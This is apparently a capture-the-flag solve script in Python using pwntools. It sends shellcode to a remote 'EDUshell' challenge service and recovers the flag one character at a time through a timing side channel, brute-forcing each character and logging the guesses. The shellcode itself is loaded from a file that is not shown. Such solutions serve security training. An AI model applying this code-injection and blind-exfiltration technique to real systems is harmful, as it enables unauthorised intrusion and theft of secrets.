#!/usr/bin/env python3
from pwn import *
import sys
import signal
from multiprocessing import Process
import string

context.arch = "amd64"

offset = 101761232

def handler(sig, frame):
    raise Exception("out of time")

def guess(pos, c):
    # r = process('./EDUshell')
    r = remote('eofqual.zoolab.org', 10101)
    r.sendlineafter('$', b'loadflag')
    code = open('./shellcode', 'r').read().format(offset + pos, c)
    shellcode = asm(code)
    r.sendline(b'exec ' + shellcode)
    signal.alarm(1)
    r.recv()
    try:
        r.recv()
    except Exception as e:
        x = str(e)
        if x == "out of time":
            return False
        else:
            return True

# DIGEST = list(range(ord('a'), ord('z') + 1)) + list(range(ord('A'), ord('Z') + 1)) + [ord('{'), ord('}'), ord('_')] + list(range(ord('0'), ord('9') + 1))

if __name__ == '__main__':
    # guess(0, ord('F'))
    signal.signal(signal.SIGALRM, handler)
    # guess(int(sys.argv[1]), int(sys.argv[2]))
    # p1 = Process(target=guess, args=(0, ord('G')))
    # p1.start()
    # p1.join(timeout=1)
    # p1.terminate()
    # print(p1.exitcode)
    with open("flag3", "a") as f:
        with open("log", "a") as log:
            for i in range(4, 50):
                proc = []
                for x in string.printable:
                    log.write("try i = %d c = %c\n" % (i, x))
                    log.flush()
                    if guess(i, ord(x)):
                        f.write(x + "\n")
                        f.flush()
                        break
            # proc.append(Process(target=guess, args=(i, x)))
        # for p in proc:
        #     p.start()
        # for p in proc:
        #     p.join(timeout=1)
        # for p in proc:
        #     p.terminate()
        # for i, p in enumerate(proc):
        #     print(p.exitcode)
            # if p.exitcode is not None:
            #     print(chr(DIGEST[i]))

